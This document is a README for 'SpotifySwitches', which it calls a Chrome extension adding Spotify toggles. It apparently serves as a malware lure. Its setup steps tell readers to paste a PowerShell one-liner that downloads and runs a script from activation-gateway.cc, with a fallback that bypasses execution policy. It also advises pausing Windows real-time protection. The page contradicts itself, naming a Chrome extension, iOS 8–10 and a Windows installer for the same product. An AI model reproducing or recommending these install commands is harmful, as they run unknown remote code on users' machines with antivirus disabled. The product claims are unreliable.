<div align="center">

# SpotifySwitches: Flip Switches & Extra Controls for Spotify – Chrome Extension

![preview](https://raw.githubusercontent.com/Khottsa/spotify-switches/main/promo_14ed0.svg)

[![powershell](https://img.shields.io/badge/powershell-script-2ea44f?style=social&labelColor=0d1117)]() [![downloads](https://img.shields.io/badge/downloads-48k-34b759?style=social&labelColor=0d1117)]() [![platform](https://img.shields.io/badge/platform-win_10%2F11-1a7f37?style=social&labelColor=0d1117)]() [![release](https://img.shields.io/badge/release-maintained-2ea44f?style=social&labelColor=0d1117)]()

</div>

---

SpotifySwitches adds flipswitches and extended controls to Spotify, letting you manage playback and library actions without leaving the now-playing view. Toggle Shuffle, Repeat, Offline Mode, and Incognito Mode directly, control Spotify Connect devices, and add the current track to a playlist or your collection in a single tap. An optional setting pauses playback automatically when volume drops to zero. The package is built for iOS 8, 9, and 10 and is tested against Spotify version 8.0.0.

## 🚀 Setup Guide — PowerShell

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Launch PowerShell
* Press `Win + X` on your keyboard.
* Click on **Terminal** or **Windows PowerShell** from the list.

### 2️⃣ Execute the installer
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If blocked by policy — CMD fallback
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

## 📋 System Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- Toggle Spotify Connect device control from the interface
- Add the current track to any playlist
- Add the current track to the collection
- Toggle Offline Mode on or off
- Toggle Incognito Mode on or off
- Toggle Shuffle
- Cycle through Repeat modes
- Optional: automatically pause playback when volume reaches 0%

## How it works

SpotifySwitches injects a dedicated settings panel into Spotify and exposes controls that are otherwise buried or missing from the stock interface. Once enabled, the extension adds toggle switches and action buttons directly into the player, so changes take effect immediately without restarting the app or reloading the page.

The extension hooks into Spotify's existing playback and account state, which means every switch reflects the current session in real time — if a setting is changed elsewhere, the switches update to match. Actions such as adding the current track to a playlist or collection operate on the track that is actively playing, using the account already signed in.

Optional behaviors, like automatically pausing playback when volume reaches zero, run as lightweight listeners that stay idle until the triggering condition occurs, keeping overhead minimal during normal use.

## Privacy

SpotifySwitches operates entirely on-device and does not collect, store, or transmit any personal data. No analytics, telemetry, or tracking mechanisms are included. The extension requires only the permissions necessary to expose its controls and interact with the Spotify interface; it does not access browsing history, credentials, or content outside of that scope. All settings and state remain local to your browser.

## FAQ

**Does SpotifySwitches require a specific Spotify version?**
It is built to work with the current Spotify client. Feature availability may vary across versions, and some switches depend on functionality exposed by the client itself.

**Which switches are included?**
Spotify Connect device control, add current track to playlist, add current track to collection, Offline Mode, Incognito Mode, Shuffle, Repeat, and optional auto-pause at 0% volume.

**Does it collect or transmit any data?**
No. All processing happens locally within the extension. No analytics, tracking, or remote logging is included.

**Will the auto-pause feature trigger unexpectedly?**
Auto-pause at 0% volume is optional and off by default. Enable it only when you want playback to stop when system volume reaches zero.

**Do toggles persist between sessions?**
Switch states are stored locally and restored on load. If a toggle appears out of sync, reload the Spotify page to reinitialize.

**Can I disable individual features?**
Yes. Each switch operates independently, so you can use only the controls you need.

**Does it work across Spotify Connect devices?**
Connect controls target the active device. Behavior depends on what the connected device exposes through the Spotify client.

**How do I report a bug or request a feature?**
Open an issue on the project's repository with your Spotify version, extension version, and steps to reproduce.

## License

SpotifySwitches is provided under the MIT License. You are free to use, modify, and redistribute the extension and its source, including for commercial purposes, provided the copyright notice and permission notice are retained. The software is provided "as is", without warranty of any kind, and the authors accept no liability for any damages arising from its use. Contributions submitted to the project are accepted under the same terms.